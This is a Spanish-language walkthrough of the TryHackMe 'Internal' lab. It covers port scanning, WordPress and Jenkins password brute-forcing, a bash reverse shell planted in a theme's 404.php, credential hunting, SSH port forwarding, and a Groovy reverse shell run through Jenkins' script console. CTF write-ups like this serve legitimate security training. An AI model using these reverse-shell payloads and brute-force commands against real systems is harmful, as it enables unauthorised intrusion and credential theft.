---
title: Internal Writeup - TryHackMe
date: 2023-04-03
categories: [Writeup, THM]
tags: [Linux, THM, CTF, Hard, Port Forwarding, Docker]
img_path: /assets/img/commons/internal/
image: internal.jpeg
---

¡Hola!

En este writeup, exploraremos la sala [**Internal**](https://tryhackme.com/room/internal) de TryHackMe, de dificultad difícil según la plataforma. A través de esta sala, explotaremos una máquina Linux en un entorno de pruebas realista. Debido a que se trata de una prueba tipo “**black box**”, no se nos proporciona información adicional para resolver el desafío.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.81.141
PING 10.10.81.141 (10.10.81.141) 56(84) bytes of data.
64 bytes from 10.10.81.141: icmp_seq=1 ttl=61 time=288 ms

--- 10.10.81.141 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 287.937/287.937/287.937/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente este ejecutando un SO Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.81.141 -oG allPorts.txt
```

Donde:

- `-p-`: indica que se escaneen todos los puertos posibles (65535) del objetivo.
- `--open`: indica que se muestren solo los puertos abiertos, ignorando los cerrados o filtrados.
- `-n`: indica que no se haga resolución DNS.
- `-sS`: indica que se use el tipo de escaneo TCP SYN.
- `-Pn`: indica que se debe omitir el descubrimiento de hosts y asumir que todos los objetivos están vivos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.81.141`: indica la dirección IP del objetivo a escanear.
- `-oG allPorts.txt`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo allPorts.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 23:14 -05
Nmap scan report for 10.10.81.141
Host is up (0.30s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds
```

Vemos que únicamente tenemos dos puertos habilitados, `HTTP (80)` y `SSH (22)`.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados, con el propósito de obtener más información sobre la configuración y posibles vulnerabilidades del sistema objetivo.

```bash
❯ nmap -p 22,80 -sV -sC --min-rate 5000 10.10.81.141 -oN services.txt
```

Donde:

- `-p 22,80`: indica que se escaneen solo los puertos especificados del objetivo.
- `-sV`: indica que se sondeen los puertos abiertos para determinar la información de servicio y versión.
- `-sC`: indica que se ejecute el script por defecto de Nmap, que realiza varias pruebas comunes como detección de vulnerabilidades o enumeración de recursos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.81.141`: indica la dirección IP del objetivo a escanear.
- `-oN services.txt`: indica que se guarde el resultado del escaneo en formato normal (fácil de leer por humanos) en el archivo services.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 23:17 -05
Nmap scan report for 10.10.81.141
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds
```

En el informe se destacan varios aspectos relevantes, entre los cuales se encuentra la posibilidad de que el sistema operativo de la máquina objetivo sea `Ubuntu`, así como la versión de los servicios SSH (`OpenSSH 7.6p1`) y HTTP (`Apache 2.4.29`).

### HTTP - 80

---

Tras identificar un servicio HTTP en el puerto 80, exploramos el contenido de la página web. Como vemos se trata de una página por defecto del servidor Apache.

![web](web.png)

A continuación, utilizamos la herramienta `wfuzz` para realizar fuzzing sobre directorios y archivos en la página web.

```bash
❯ wfuzz -c -L -t 100 --hc=404,403 --hh=10918 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.81.141/FUZZ
```

Donde:

- `-c`: muestra la salida con colores.
- `-L`: sigue las redirecciones HTTP.
- `-t 100`: establece el número de hilos concurrentes a 100.
- `--hc=404,403`: oculta las respuestas HTTP con los códigos 404 y 403.
- `-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`: usa el archivo indicado como diccionario de palabras para el fuzzing.
- `http://10.10.81.141/FUZZ`: usa la URL indicada como objetivo del fuzzing, reemplazando la palabra FUZZ por cada palabra del diccionario.

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.81.141/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                              
=====================================================================

000000032:   200        329 L    3644 W     53942 Ch    "blog"                                                                                                               
000010825:   200        25 L     359 W      10508 Ch    "phpmyadmin"                                                                                                         

Total time: 691.8127
Processed Requests: 220560
Filtered Requests: 220558
Requests/sec.: 318.8146
```

El reporte de `wfuzz` nos indica que se encontró dos directorios: `blog` y `phpmyadmin`.

Al realizar una inspección del directorio `blog`, identificamos la presencia de una página web que llamó nuestra atención:

![blog](blog.png)

Como se puede observar, parece que no se están cargando todos los recursos de la página. Al inspeccionarla, identificamos que se está intentando obtener recursos del dominio `internal.thm`. Esto sugiere que se está utilizando virtual hosting en la máquina objetivo.

![get](get.png)

Por lo tanto, agregamos la entrada `internal.thm` al archivo `/etc/hosts` de nuestra máquina, para que pueda resolver el dominio correctamente.

```bash
❯ echo '10.10.81.141\tinternal.thm' >> /etc/hosts
```

Ahora procedemos a recargar la página web y podemos verificar que los recursos se han cargado correctamente.

![blog1](blog1.png)

Con la ayuda de la extensión `Wappalyzer`, obtenemos información sobre las tecnologías web que se están utilizando en el servidor. Destacamos que la página utiliza el gestor de contenidos **WordPress** y su versión es la `5.4.2`.

![wappalyzer](wappalyzer.png)

Al examinar detalladamente la página web, pudimos identificar un enlace de "**Log in**" que nos dirige al panel de inicio de sesión de WordPress.

![login](login.png)

Una estrategia útil para enumerar usuarios válidos en WordPress es utilizar el panel de inicio de sesión, ya que aunque no conozcamos la contraseña, podemos verificar si el usuario existe. Si el intento de inicio de sesión falla, el mensaje de error que se devuelve suele incluir el nombre de usuario, como en el caso de "*The password you entered for the username admin is incorrect*", lo que sugiere que el usuario existe pero la contraseña es incorrecta.

Realizamos una prueba con algunos usuarios por defecto y logramos confirmar la existencia del usuario `admin`.

![user](user.png)

# Explotación

---

Ahora que sabemos que el usuario `admin` existe, procedemos a realizar un ataque de fuerza bruta para encontrar una contraseña válida. Para ello, podemos utilizar el siguiente comando de `wpscan`:

```bash
wpscan --url http://internal.thm/blog/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt -t 100
```

Después de ejecutar el comando de `wpscan`, el informe final nos revela que la contraseña válida del usuario `admin` es `my2boys`.

```bash
[...]

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                                           
Trying admin / floppy Time: 00:01:06 <                                                                                                       > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[...]
```

Con las credenciales del usuario `admin`, podemos iniciar sesión en el panel de WordPress. 

![wp-admin](wp-admin.png)

Ya que hemos iniciado sesión con las credenciales del usuario `admin`, podemos modificar un archivo `.php` del tema actualmente utilizado.

Para ello, nos dirigimos a la sección `Appearance` del panel de control de WordPress, luego seleccionamos `Theme Editor`. 

![wp-admin1](wp-admin1.png)

A continuación, se sugiere seleccionar el archivo `404.php` del lado derecho. Si se desea ser más discreto, se podría modificar ligeramente el archivo existente para agregar una reverse shell, como se muestra a continuación mediante una simple shell PHP:

```bash
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.11.100/443 0>&1'");
```

![404](404.png)

Después de haber añadido la línea de código mencionada, procedimos a actualizar el archivo modificado en el servidor. A continuación, llevamos a cabo una búsqueda en el repositorio oficial de WordPress en GitHub para localizar la ruta del archivo `404.php` correspondiente al tema utilizado en la página web, que en este caso es `twentyseventeen`. Tras una inspección detallada, determinamos que la ruta correspondiente al archivo `404.php` es `/wp-content/themes/twentyseventeen/404.php`.

Con el fin de obtener acceso a la máquina, iniciamos la escucha del puerto especificado en el código (443) y posteriormente accedemos a la ruta `/wp-content/themes/twentyseventeen/404.php` desde el navegador.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.81.141] 34938
bash: cannot set terminal process group (1093): Inappropriate ioctl for device
bash: no job control in this shell
www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ id
<tml/wordpress/wp-content/themes/twentyseventeen$ id                         
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A continuación procedemos a realizar un **tratamiento de la TTY** para tener una shell inversa más interactiva y funcional. Para ello seguimos los siguientes pasos descritos en: [Tratamiento de la TTY](https://itzjp-sec.github.io/posts/tratamiento-tty/).

### Pivoting horizontal

Al acceder al sistema, iniciamos sesión como el usuario `www-data`. 

Realizamos una enumeración de usuarios del sistema y podemos observar que el usuario principal del servidor es `aubreanna`.

```bash
www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ cat /etc/passwd
 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```

Intentamos acceder al directorio personal de `aubreanna` para leer la flag, sin embargo, no teníamos los permisos necesarios para hacerlo.

Este indicador sugiere que debemos escalar nuestros privilegios al usuario `aubreanna` para poder avanzar. Realizamos una enumeración básica y se intentó listar los permisos de sudo, pero sin éxito debido a que no contábamos con la contraseña del usuario. También se buscó binarios con permisos SUID, pero no se encontró ninguno con un vector de ataque viable.

Si inspeccionamos el archivo de configuración de WordPress (`wp-config.php`) ubicado en `/var/www/html/wordpress`, podemos identificar un nombre de usuario y una contraseña de la base de datos. Sin embargo, no resultaron muy útiles para nosotros.

```bash
[...]

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress123' );

[...]
```

Luego procedemos a buscar archivos confidenciales que contengan la palabra `credentials` de manera recursiva desde el directorio raíz con el siguiente comando:

```bash
www-data@internal:/var/www/html/wordpress$ grep -r -i credentials / 2>/dev/null
<tml/wordpress$ grep -r -i credentials / 2>/dev/null
/opt/wp-save.txt:Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
```

En este caso, identificamos un archivo sospechoso en el directorio `/opt` llamado `wp-save.txt`, así que procedemos a inspeccionar su contenido.

```bash
www-data@internal:/opt$ cat wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

Como se puede observar, el archivo contiene las credenciales del usuario `aubreanna`. Con esta información, ya podemos cambiar de usuario utilizando dichas credenciales.

```bash
www-data@internal:/opt$ su aubreanna
su aubreanna
Password: bubb13guM!@#123

aubreanna@internal:/opt$ id
id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
```

Una vez ya como usuario `aubreanna`, podemos acceder a su directorio personal y leer la primera flag.

```bash
**aubreanna@internal:~$ cat user.txt
cat user.txt
THM{***************}**
```

# Escalación de privilegios

---

Al listar el contenido del directorio del usuario, encontramos el siguiente archivo:

```bash
aubreanna@internal:~$ ls -l
ls -l
total 12
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
```

Si inspeccionamos el contenido del archivo, encontramos información que indica que hay un servicio interno de Jenkins ejecutándose en la dirección IP `172.17.0.2` en el puerto `8080`.

```bash
aubreanna@internal:~$ cat jenkins.txt
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

Si listamos las interfaces de red, podemos identificar una que hace referencia a **Docker**, lo que nos sujiere que en el sistema se está ejecutando el servicio Jenkins en un contenedor **Docker** en el puerto `8080`.

```bash
aubreanna@internal:~$ ifconfig
ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:87ff:feff:3fdc  prefixlen 64  scopeid 0x20<link>
        ether 02:42:87:ff:3f:dc  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 420 (420.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19  bytes 1394 (1.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[...]
```

Si realizamos una lista de los puertos en uso utilizando el comando `netstat`, podremos verificar que efectivamente el puerto `8080` se encuentra en escucha internamente en el sistema.

```bash
aubreanna@internal:~$ netstat -putona
netstat -putona
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:39381         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)

[...]
```

### Port Forwarding

Nuestro siguiente paso será hacer un **Port Forwarding** para poder analizar el servicio Jenkins en nuestra máquina. Podríamos realizar un **Local Port Forwarding** para redirigir el puerto `8081` de nuestra máquina local (cliente_ssh) al puerto `8080` de la máquina objetivo (servidor_ssh), utilizando el siguiente comando:

```bash
❯ ssh -L 8081:localhost:8080 aubreanna@10.10.81.141
The authenticity of host '10.10.81.141 (10.10.81.141)' can't be established.
ED25519 key fingerprint is SHA256:seRYczfyDrkweytt6CJT/aBCJZMIcvlYYrTgoGxeHs4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.81.141' (ED25519) to the list of known hosts.
aubreanna@10.10.81.141's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$ whoami                                                                                                                                                         
aubreanna
```

Posteriormente, si ejecutamos el siguiente comando en nuestra máquina local, podremos comprobar que el puerto `8081` ya está en escucha.

```bash
❯ netstat -putona
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 10.2.11.100:443         10.10.81.141:34944      ESTABLISHED -                    off (0.00/0/0)
tcp        0      0 10.2.11.100:56122       10.10.81.141:22         ESTABLISHED -                    keepalive (7073,24/0/0)

[...]
```

Una vez realizado el Local Port Forwarding, podríamos acceder al servicio de Jenkins en la máquina objetivo desde nuestra máquina local a través del navegador web mediante la dirección `http://localhost:8081` o `http://127.0.0.1:8081`. De esta manera, podemos interactuar con el servicio de Jenkins como si estuviéramos accediendo a él directamente desde la máquina objetivo.

![jenkins](jenkins.png)

### Ataque de fuerza bruta a Jenkins

Al no funcionar las contraseñas por defecto (`admin/password`) en nuestro caso, la siguiente opción sería intentar realizar un ataque de fuerza bruta al panel de inicio de sesión de Jenkins. Para llevar a cabo esta tarea, utilizamos la herramienta Hydra y ejecutamos el siguiente comando:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8081 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password' -t 64
```

> En este caso, utilizamos el método `POST` ya que, al inspeccionar la forma en que se realiza la petición, observamos que es el método utilizado junto con los parámetros que se envían en la solicitud.
{: .prompt-info }

![red](red.png)

Al finalizar el ataque, la herramienta nos proporciona la contraseña correspondiente al usuario `admin`.

```bash
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8081 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password' -t 20
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-03 24:45:15
[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344399 login tries (l:1/p:14344399), ~717220 tries per task
[DATA] attacking http-post-form://localhost:8081/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[8081][http-post-form] host: localhost   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-03 24:45:42
```

Utilizando las credenciales obtenidas, iniciamos sesión en el panel de Jenkins.

![jenkins1](jenkins1.png)

En este punto, podemos dirigirnos a la sección `Administrar Jenkins` y luego seleccionar `Consola de scripts`. Desde allí, generamos un script en Groovy utilizando [Reverse Shell Generator](https://www.revshells.com/) que nos permita obtener una shell inversa.

```bash
 String host="10.2.11.100";int port=444;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![consola](consola.png)

Una vez generado el script en Groovy, nos ponemos a la escucha en el puerto especificado (`4444`) y lo ejecutamos para obtener acceso al Docker de la máquina víctima.

```bash
❯ nc -nlvp 444
listening on [any] 444 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.81.141] 32796
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

Después, nuevamente realizamos una búsqueda recursiva de archivos confidenciales que contengan la palabra `credentials` desde el directorio raíz, utilizando el siguiente comando:

```bash
grep -r -i credentials / 2>/dev/null
/opt/note.txt:Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
```

Durante la búsqueda, identificamos un archivo sospechoso en `/opt/note.txt`. Por lo tanto, procedemos a inspeccionar su contenido.

```bash
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.
```

El contenido del archivo nos revela las credenciales del usuario `root`. 

```bash
aubreanna@internal:~$ su root
Password: 
root@internal:/home/aubreanna# id      
uid=0(root) gid=0(root) groups=0(root)
```

Finalmente, accedemos al directorio personal del usuario root y leemos la flag correspondiente a dicho usuario.

```bash
root@internal:~# cat root.txt 
THM{****************}
```

¡Happy Hacking!
